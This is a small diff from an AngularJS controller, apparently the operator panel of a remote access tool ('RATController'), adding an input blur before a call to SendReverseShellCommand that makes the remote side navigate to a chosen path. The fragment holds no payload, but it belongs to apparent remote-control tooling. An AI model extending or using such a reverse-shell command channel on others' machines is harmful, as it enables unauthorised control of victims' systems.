@@ -399,6 +399,7 @@ Flinger.controller("RATController", function ($scope, RATService, $rootScope) {
     }
 
     $scope.NavigateVisor = function(){
+        $('.tools-bar>input').blur();
         $scope.SendReverseShellCommand(`location.assign('${$scope.CurrentUserPath}')`);
     }
 
